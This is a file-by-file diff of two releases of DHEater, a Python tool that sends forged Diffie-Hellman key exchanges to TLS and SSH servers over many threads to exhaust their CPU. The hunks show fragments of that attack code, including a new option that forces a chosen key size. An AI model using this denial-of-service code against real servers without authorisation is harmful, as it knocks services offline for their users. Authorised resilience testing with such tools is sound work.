# Comparing `tmp/DHEater-0.3.2.tar.gz` & `tmp/DHEater-0.4.0.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "DHEater-0.3.2.tar", last modified: Thu Feb  3 14:22:22 2022, max compression
+gzip compressed data, was "DHEater-0.4.0.tar", last modified: Sun May  7 11:42:13 2023, max compression
```

## Comparing `DHEater-0.3.2.tar` & `DHEater-0.4.0.tar`

### file list

```diff
@@ -1,20 +1,22 @@
-drwxrwxr-x   0 coroner   (1000) coroner   (1000)        0 2022-02-03 14:22:22.757991 DHEater-0.3.2/
-drwxrwxr-x   0 coroner   (1000) coroner   (1000)        0 2022-02-03 14:22:22.753991 DHEater-0.3.2/DHEater.egg-info/
--rw-rw-r--   0 coroner   (1000) coroner   (1000)     6978 2022-02-03 14:22:22.000000 DHEater-0.3.2/DHEater.egg-info/PKG-INFO
--rw-rw-r--   0 coroner   (1000) coroner   (1000)      305 2022-02-03 14:22:22.000000 DHEater-0.3.2/DHEater.egg-info/SOURCES.txt
--rw-rw-r--   0 coroner   (1000) coroner   (1000)        1 2022-02-03 14:22:22.000000 DHEater-0.3.2/DHEater.egg-info/dependency_links.txt
--rw-rw-r--   0 coroner   (1000) coroner   (1000)       49 2022-02-03 14:22:22.000000 DHEater-0.3.2/DHEater.egg-info/entry_points.txt
--rw-rw-r--   0 coroner   (1000) coroner   (1000)      138 2022-02-03 14:22:22.000000 DHEater-0.3.2/DHEater.egg-info/requires.txt
--rw-rw-r--   0 coroner   (1000) coroner   (1000)        8 2022-02-03 14:22:22.000000 DHEater-0.3.2/DHEater.egg-info/top_level.txt
--rw-rw-r--   0 coroner   (1000) coroner   (1000)    11357 2021-08-31 12:42:56.000000 DHEater-0.3.2/LICENSE.txt
--rw-rw-r--   0 coroner   (1000) coroner   (1000)       38 2021-08-31 11:05:01.000000 DHEater-0.3.2/MANIFEST.in
--rw-rw-r--   0 coroner   (1000) coroner   (1000)     6978 2022-02-03 14:22:22.757991 DHEater-0.3.2/PKG-INFO
--rw-rw-r--   0 coroner   (1000) coroner   (1000)     5440 2022-02-02 19:15:22.000000 DHEater-0.3.2/README.md
-drwxrwxr-x   0 coroner   (1000) coroner   (1000)        0 2022-02-03 14:22:22.757991 DHEater-0.3.2/dheater/
--rwxrwxr-x   0 coroner   (1000) coroner   (1000)    22463 2022-02-03 14:04:40.000000 DHEater-0.3.2/dheater/__main__.py
--rw-rw-r--   0 coroner   (1000) coroner   (1000)      379 2022-02-03 14:19:31.000000 DHEater-0.3.2/dheater/__setup__.py
--rw-rw-r--   0 coroner   (1000) coroner   (1000)       75 2022-02-03 14:18:44.000000 DHEater-0.3.2/requirements.txt
--rw-rw-r--   0 coroner   (1000) coroner   (1000)       38 2022-02-03 14:22:22.757991 DHEater-0.3.2/setup.cfg
--rw-rw-r--   0 coroner   (1000) coroner   (1000)     2562 2021-11-12 18:23:23.000000 DHEater-0.3.2/setup.py
-drwxrwxr-x   0 coroner   (1000) coroner   (1000)        0 2022-02-03 14:22:22.757991 DHEater-0.3.2/test/
--rw-rw-r--   0 coroner   (1000) coroner   (1000)      823 2021-11-22 09:54:12.000000 DHEater-0.3.2/test/test_tls.py
+drwxr-xr-x   0 coroner   (1000) coroner   (1000)        0 2023-05-07 11:42:13.894107 DHEater-0.4.0/
+drwxr-xr-x   0 coroner   (1000) coroner   (1000)        0 2023-05-07 11:42:13.892108 DHEater-0.4.0/DHEater.egg-info/
+-rw-rw-r--   0 coroner   (1000) coroner   (1000)    10193 2023-05-07 11:42:13.000000 DHEater-0.4.0/DHEater.egg-info/PKG-INFO
+-rw-rw-r--   0 coroner   (1000) coroner   (1000)      341 2023-05-07 11:42:13.000000 DHEater-0.4.0/DHEater.egg-info/SOURCES.txt
+-rw-rw-r--   0 coroner   (1000) coroner   (1000)        1 2023-05-07 11:42:13.000000 DHEater-0.4.0/DHEater.egg-info/dependency_links.txt
+-rw-rw-r--   0 coroner   (1000) coroner   (1000)       48 2023-05-07 11:42:13.000000 DHEater-0.4.0/DHEater.egg-info/entry_points.txt
+-rw-rw-r--   0 coroner   (1000) coroner   (1000)      104 2023-05-07 11:42:13.000000 DHEater-0.4.0/DHEater.egg-info/requires.txt
+-rw-rw-r--   0 coroner   (1000) coroner   (1000)        8 2023-05-07 11:42:13.000000 DHEater-0.4.0/DHEater.egg-info/top_level.txt
+-rw-r--r--   0 coroner   (1000) coroner   (1000)    11357 2021-09-20 15:31:58.000000 DHEater-0.4.0/LICENSE.txt
+-rw-r--r--   0 coroner   (1000) coroner   (1000)       38 2021-09-20 15:31:58.000000 DHEater-0.4.0/MANIFEST.in
+-rw-r--r--   0 coroner   (1000) coroner   (1000)    10193 2023-05-07 11:42:13.894107 DHEater-0.4.0/PKG-INFO
+-rw-r--r--   0 coroner   (1000) coroner   (1000)     8675 2023-05-04 21:35:03.000000 DHEater-0.4.0/README.md
+drwxr-xr-x   0 coroner   (1000) coroner   (1000)        0 2023-05-07 11:42:13.893108 DHEater-0.4.0/dheater/
+-rwxr-xr-x   0 coroner   (1000) coroner   (1000)    24038 2023-05-04 21:35:03.000000 DHEater-0.4.0/dheater/__main__.py
+-rw-r--r--   0 coroner   (1000) coroner   (1000)      379 2023-05-04 21:41:52.000000 DHEater-0.4.0/dheater/__setup__.py
+-rw-r--r--   0 coroner   (1000) coroner   (1000)       41 2023-05-04 21:35:03.000000 DHEater-0.4.0/requirements.txt
+-rw-r--r--   0 coroner   (1000) coroner   (1000)       38 2023-05-07 11:42:13.894107 DHEater-0.4.0/setup.cfg
+-rw-r--r--   0 coroner   (1000) coroner   (1000)     2618 2023-05-07 11:39:08.000000 DHEater-0.4.0/setup.py
+drwxr-xr-x   0 coroner   (1000) coroner   (1000)        0 2023-05-07 11:42:13.893108 DHEater-0.4.0/test/
+-rw-r--r--   0 coroner   (1000) coroner   (1000)      823 2023-05-04 21:35:03.000000 DHEater-0.4.0/test/test_tls.py
+drwxr-xr-x   0 coroner   (1000) coroner   (1000)        0 2023-05-07 11:42:13.893108 DHEater-0.4.0/tools/
+-rwxr-xr-x   0 coroner   (1000) coroner   (1000)     1649 2023-05-04 21:35:03.000000 DHEater-0.4.0/tools/dh_param_priv_key_size_setter
```

### Comparing `DHEater-0.3.2/LICENSE.txt` & `DHEater-0.4.0/LICENSE.txt`

 * *Files identical despite different names*

### Comparing `DHEater-0.3.2/dheater/__main__.py` & `DHEater-0.4.0/dheater/__main__.py`

 * *Files 5% similar despite different names*

```diff
@@ -11,23 +11,24 @@
 from collections import deque
 from operator import methodcaller
 
 import abc
 import attr
 import urllib3
 
-from cryptoparser.common.algorithm import Authentication
+from cryptodatahub.common.algorithm import Authentication
+
 from cryptoparser.common.exception import InvalidType, NotEnoughData
 
 from cryptoparser.tls.algorithm import TlsSignatureAndHashAlgorithm
 from cryptoparser.tls.ciphersuite import TlsCipherSuite
 from cryptoparser.tls.extension import TlsNamedCurve, TlsExtensionEllipticCurves
 from cryptoparser.tls.record import TlsRecord
 from cryptoparser.tls.subprotocol import TlsHandshakeType
-from cryptoparser.tls.version import TlsProtocolVersionFinal, TlsVersion
+from cryptoparser.tls.version import TlsProtocolVersion, TlsVersion
 
 from cryptoparser.ssh.record import SshRecordInit, SshRecordKexDH, SshRecordKexDHGroup
 from cryptoparser.ssh.subprotocol import (
     SshProtocolMessage,
     SshDHGroupExchangeInit,
     SshDHGroupExchangeRequest,
     SshDHKeyExchangeInit,
@@ -59,14 +60,18 @@
 )
 
 from dheater import __setup__
 
 
 @attr.s
 class DHEPreCheckResultBase():
+    enforcable_key_size = attr.ib(
+        converter=attr.converters.optional(int), validator=attr.validators.optional(attr.validators.instance_of(int))
+    )
+
     @property
     @abc.abstractmethod
     def key_size(self):
         raise NotImplementedError()
 
     @property
     @abc.abstractmethod
@@ -83,14 +88,17 @@
     time_interval = attr.ib(init=False, default=0, validator=attr.validators.instance_of(int))
 
 
 @attr.s(eq=False)
 class DHEnforcerThreadBase(threading.Thread):
     uri = attr.ib(validator=attr.validators.instance_of(urllib3.util.url.Url))
     timeout = attr.ib(converter=float, validator=attr.validators.instance_of(float))
+    enforcable_key_size = attr.ib(
+        converter=attr.converters.optional(int), validator=attr.validators.optional(attr.validators.instance_of(int))
+    )
     pre_check_result = attr.ib(default=None)
     message_bytes = attr.ib(init=False, default=bytearray(), validator=attr.validators.instance_of(bytearray))
     stats = attr.ib(
         init=False, default=DHEnforcerThreadStats(), validator=attr.validators.instance_of(DHEnforcerThreadStats)
     )
     _stop_event = attr.ib(init=False, default=None)
 
@@ -156,41 +164,59 @@
 
 @attr.s
 class DHEPreCheckResultSSH(DHEPreCheckResultBase):  # pylint: disable=too-few-public-methods
     protocol_version = attr.ib(validator=attr.validators.instance_of(SshProtocolVersion))
     ciphers_result = attr.ib(validator=attr.validators.instance_of(cryptolyzer.ssh.ciphers.AnalyzerResultCiphers))
     dhparams_result = attr.ib(validator=attr.validators.instance_of(cryptolyzer.ssh.dhparams.AnalyzerResultDHParams))
 
-    def get_greatest_key_size_and_algorithm(self):
+    def get_key_size_and_algorithm(self):
         dhparams_result = self.dhparams_result
-        algorithm_with_greatest_key_size = None
+        algorithm = None
+        key_size = None
         if dhparams_result.key_exchange:
-            algorithm_with_greatest_key_size = sorted(
-                dhparams_result.key_exchange.kex_algorithms,
-                key=lambda algorithm: algorithm.value.key_size,
-                reverse=True
-            )[0]
-            greatest_key_size = algorithm_with_greatest_key_size.value.key_size
-        if (dhparams_result.group_exchange and
-            (algorithm_with_greatest_key_size is None or
-                dhparams_result.group_exchange.key_sizes[-1] > greatest_key_size)):
-            algorithm_with_greatest_key_size = dhparams_result.group_exchange.gex_algorithms[0]
-            greatest_key_size = dhparams_result.group_exchange.key_sizes[-1]
+            kex_algorithms = dhparams_result.key_exchange.kex_algorithms
+            if self.enforcable_key_size is not None:
+                kex_algorithms = [
+                    algorithm
+                    for algorithm in dhparams_result.key_exchange.kex_algorithms
+                    if self.enforcable_key_size == algorithm.value.key_size
+                ]
+
+            if kex_algorithms:
+                algorithm = sorted(
+                    kex_algorithms,
+                    key=lambda algorithm: algorithm.value.key_size,
+                    reverse=True
+                )[0]
+                key_size = algorithm.value.key_size
+
+        if dhparams_result.group_exchange:
+            if self.enforcable_key_size is None:
+                if key_size is None or dhparams_result.group_exchange.key_sizes[-1] > key_size:
+                    algorithm = dhparams_result.group_exchange.gex_algorithms[0]
+                    key_size = dhparams_result.group_exchange.key_sizes[-1]
+            else:
+                if key_size is None or self.enforcable_key_size in dhparams_result.group_exchange.key_sizes:
+                    algorithm = dhparams_result.group_exchange.gex_algorithms[0]
+                    key_size = self.enforcable_key_size
+
+        if key_size is None:
+            raise NotImplementedError()
 
-        return greatest_key_size, algorithm_with_greatest_key_size
+        return key_size, algorithm
 
     @property
     def key_size(self):
-        greatest_key_size, _ = self.get_greatest_key_size_and_algorithm()
+        key_size, _ = self.get_key_size_and_algorithm()
 
-        return greatest_key_size
+        return key_size
 
     @property
     def algorithm_name(self):
-        _, algorithm_with_greatest_key_size = self.get_greatest_key_size_and_algorithm()
+        _, algorithm_with_greatest_key_size = self.get_key_size_and_algorithm()
 
         return algorithm_with_greatest_key_size.value.code
 
 
 class DHEnforcerThreadSSH(DHEnforcerThreadBase):
     group_exchange = attr.ib(init=False, default=False, validator=attr.validators.instance_of(bool))
 
@@ -206,15 +232,17 @@
 
         analyzer = cryptolyzer.ssh.dhparams.AnalyzerDHParams()
         dhparams_result = analyzer.analyze(self._get_client(timeout))
         if dhparams_result.key_exchange is None and dhparams_result.group_exchange is None:
             raise NotImplementedError()
 
         protocol_version = SshProtocolVersion(SshVersion.SSH2, 0)
-        self.pre_check_result = DHEPreCheckResultSSH(protocol_version, ciphers_result, dhparams_result)
+        self.pre_check_result = DHEPreCheckResultSSH(
+            self.enforcable_key_size, protocol_version, ciphers_result, dhparams_result
+        )
 
     def _get_client(self, timeout=None):
         if self.uri.scheme is None:
             scheme = 'ssh'
         else:
             scheme = self.uri.scheme
 
@@ -229,19 +257,18 @@
 
     def _prepare_packets(self):
         message_bytes = bytearray()
         protocol_message = SshProtocolMessage(
             protocol_version=SshProtocolVersion(SshVersion.SSH2, 0),
             software_version=SshSoftwareVersionUnparsed(f'{__setup__.__title__}_{__setup__.__version__}'),
         )
-        key_size, key_exchange_algorithm_with_greatest_key_size = \
-            self.pre_check_result.get_greatest_key_size_and_algorithm()
+        key_size, kex_algorithm = self.pre_check_result.get_key_size_and_algorithm()
         ciphers_result = self.pre_check_result.ciphers_result
         key_exchange_init_message = SshKeyExchangeInitAnyAlgorithm(
-            kex_algorithms=[key_exchange_algorithm_with_greatest_key_size, ],
+            kex_algorithms=[kex_algorithm, ],
             host_key_algorithms=[self._get_shortest_algorithm(ciphers_result.host_key_algorithms), ],
             encryption_algorithms_client_to_server=[
                 self._get_shortest_algorithm(ciphers_result.encryption_algorithms_client_to_server),
             ],
             encryption_algorithms_server_to_client=[
                 self._get_shortest_algorithm(ciphers_result.encryption_algorithms_server_to_client),
             ],
@@ -268,15 +295,15 @@
             if well_known_dh_param.value.key_size == key_size
         ][0]
         dh_ephemeral_public_key = get_dh_ephemeral_key_forged(
             well_known_dh_param_with_matching_key_size.value.dh_param_numbers.p
         )
         dh_ephemeral_public_key_bytes = int_to_bytes(dh_ephemeral_public_key, key_size).lstrip(b'\x00')
 
-        if key_exchange_algorithm_with_greatest_key_size.value.key_size is not None:
+        if kex_algorithm.value.key_size is not None:
             dh_key_exchange_init_message = SshDHKeyExchangeInit(dh_ephemeral_public_key_bytes)
             message_bytes += SshRecordKexDH(dh_key_exchange_init_message).compose()
         else:
             self.group_exchange = True
 
             dh_group_exchange_request_message = SshDHGroupExchangeRequest(
                 gex_min=key_size, gex_max=key_size, gex_number=key_size
@@ -315,15 +342,15 @@
 
         return sent_byte_count, received_byte_count
 
 
 @attr.s
 class DHEPreCheckResultTLS(DHEPreCheckResultBase):  # pylint: disable=too-few-public-methods
     dh_public_key = attr.ib(validator=attr.validators.instance_of((DHPublicKey, TlsNamedCurve)))
-    protocol_version = attr.ib(validator=attr.validators.instance_of(TlsProtocolVersionFinal))
+    protocol_version = attr.ib(validator=attr.validators.instance_of(TlsProtocolVersion))
     cipher_suite = attr.ib(validator=attr.validators.instance_of(TlsCipherSuite))
     receivable_byte_count = attr.ib(validator=attr.validators.instance_of(int))
 
     @property
     def key_size(self):
         if isinstance(self.dh_public_key, TlsNamedCurve):
             return self.dh_public_key.value.named_group.value.size
@@ -343,29 +370,34 @@
     def _pre_check(self):
         timeout = L4ClientTCP.get_default_timeout()
         analyzer = cryptolyzer.tls.versions.AnalyzerVersions()
         analyzer_result_versions = analyzer.analyze(self._get_client(timeout=timeout), None)
 
         protocol_version = max(analyzer_result_versions.versions)
         dh_public_key = None
-        if protocol_version > TlsProtocolVersionFinal(TlsVersion.TLS1_2):
-            named_curves = sorted(
+        if protocol_version > TlsProtocolVersion(TlsVersion.TLS1_2):
+            named_curves = list(sorted(
                 TlsHandshakeClientHelloKeyExchangeDHE._NAMED_CURVES,  # pylint: disable=protected-access
                 key=lambda named_curve: named_curve.value.named_group.value.size, reverse=True
-            )
+            ))
+            if self.enforcable_key_size is not None:
+                named_curves = list(filter(
+                    lambda named_curve: named_curve.value.named_group.value.size == self.enforcable_key_size,
+                    named_curves
+                ))
             for named_curve in named_curves:
                 client_hello = TlsHandshakeClientHelloKeyExchangeDHE(
                     protocol_version, self.uri.host, named_curves=[named_curve, ]
                 )
                 try:
                     server_messages = self._get_client().do_tls_handshake(
                         client_hello, last_handshake_message_type=TlsHandshakeType.SERVER_HELLO
                     )
-                except (TlsAlert, NotEnoughData):
-                    break
+                except (TlsAlert, NotEnoughData, NetworkError):
+                    continue
                 else:
                     dh_public_key = named_curve
                     break
 
         if dh_public_key is None:
             protocol_version = min(analyzer_result_versions.versions)
             client_hello = TlsHandshakeClientHelloKeyExchangeDHE(protocol_version, self.uri.host)
@@ -376,22 +408,26 @@
             except (TlsAlert, NotEnoughData) as e:
                 raise NotImplementedError() from e
             else:
                 if TlsHandshakeType.SERVER_KEY_EXCHANGE not in server_messages:
                     raise NotImplementedError()
 
                 dh_public_key = parse_tls_dh_params(server_messages[TlsHandshakeType.SERVER_KEY_EXCHANGE].param_bytes)
+                if (dh_public_key is not None and self.enforcable_key_size is not None and
+                        self.enforcable_key_size != dh_public_key.key_size):
+                    raise NotImplementedError()
 
         # Last received message is server key exchange so only its first byte should be counted
         receivable_byte_count = sum([
             len(server_message.compose())
             for handshake_type, server_message in server_messages.items()
             if handshake_type != TlsHandshakeType.SERVER_KEY_EXCHANGE
         ]) + 1
         self.pre_check_result = DHEPreCheckResultTLS(
+            enforcable_key_size=self.enforcable_key_size,
             dh_public_key=dh_public_key,
             protocol_version=protocol_version,
             cipher_suite=server_messages[TlsHandshakeType.SERVER_HELLO].cipher_suite,
             receivable_byte_count=receivable_byte_count,
         )
 
     def _get_client(self, timeout=None):
@@ -416,15 +452,15 @@
         elif cipher_suite.value.authentication == Authentication.ECDSA:
             signature_algorithms = [
                 TlsSignatureAndHashAlgorithm.ECDSA_SHA256,
                 TlsSignatureAndHashAlgorithm.ECDSA_SHA1,
             ]
 
         client_hello_class = TlsHandshakeClientHelloSpecalization
-        if protocol_version > TlsProtocolVersionFinal(TlsVersion.TLS1_2):
+        if protocol_version > TlsProtocolVersion(TlsVersion.TLS1_2):
             signature_algorithms = None
             extensions = client_hello_class._get_tls1_3_extensions(  # pylint: disable=protected-access
                     [protocol_version, ], [self.pre_check_result.dh_public_key, ], signature_algorithms
                 )
             extensions.append(TlsExtensionEllipticCurves([self.pre_check_result.dh_public_key, ]))
             client_hello = TlsHandshakeClientHelloKeyExchangeDHE(
                 protocol_version=protocol_version,
@@ -486,29 +522,33 @@
         help='socket timeout in seconds (default: %(default)ss)'
     )
     parser.add_argument(
         '--thread-num', dest='thread_num', default=1, type=int,
         help='number of threads to run (default: %(default)s)'
     )
     parser.add_argument(
+        '--key-size', dest='key_size', default=None, type=int,
+        help='key size to enforce (default: %(default)s)'
+    )
+    parser.add_argument(
         '--protocol', dest='protocol', required=True, choices=['tls', 'ssh', ], help='name of the protocol'
     )
     parser.add_argument('uri', metavar='uri', action=ParseURI, help='uri of the service')
 
     args = parser.parse_args()
     threads = []
 
     try:
         pre_check_result = None
         for _ in range(args.thread_num):
             try:
                 if args.protocol == 'tls':
-                    enforcer = DHEnforcerThreadTLS(args.uri, args.timeout, pre_check_result)
+                    enforcer = DHEnforcerThreadTLS(args.uri, args.timeout, args.key_size, pre_check_result)
                 elif args.protocol == 'ssh':
-                    enforcer = DHEnforcerThreadSSH(args.uri, args.timeout, pre_check_result)
+                    enforcer = DHEnforcerThreadSSH(args.uri, args.timeout, args.key_size, pre_check_result)
             except NetworkError as e:
                 if pre_check_result is None:
                     print(
                         f'Network error oocuerd while checking whether Diffie-Hellman ephemeral (DHE) key exchange '
                         f'is supported by the server; uri="{args.uri}", error="{e}"'
                     )
                     return
@@ -549,15 +589,15 @@
             pre_check_result.algorithm_name,
         ))
 
         while True:
             time.sleep(0.2)
     except NotImplementedError:
         print(
-            f'Diffie-Hellman ephemeral (DHE) key exchange not supported by the server; '
+            f'Diffie-Hellman ephemeral (DHE) key exchange (with the given key size) not supported by the server; '
             f'uri="{args.uri}", protocol="{args.protocol}"'
         )
     except KeyboardInterrupt:
         deque(map(methodcaller('stop'), threads))
         deque(map(methodcaller('join'), threads))
```

### Comparing `DHEater-0.3.2/setup.py` & `DHEater-0.4.0/setup.py`

 * *Files 5% similar despite different names*

```diff
@@ -54,14 +54,16 @@
         "pylint": ["pylint", ],
     },
 
     packages=[
         'dheater',
     ],
 
+    scripts = ['tools/dh_param_priv_key_size_setter'],
+
     test_suite='setup.test_discover',
 
     classifiers=[
         'Development Status :: 3 - Alpha',
         'Intended Audience :: Information Technology',
         'Intended Audience :: Science/Research',
         'Intended Audience :: System Administrators',
```

### Comparing `DHEater-0.3.2/test/test_tls.py` & `DHEater-0.4.0/test/test_tls.py`

 * *Files identical despite different names*

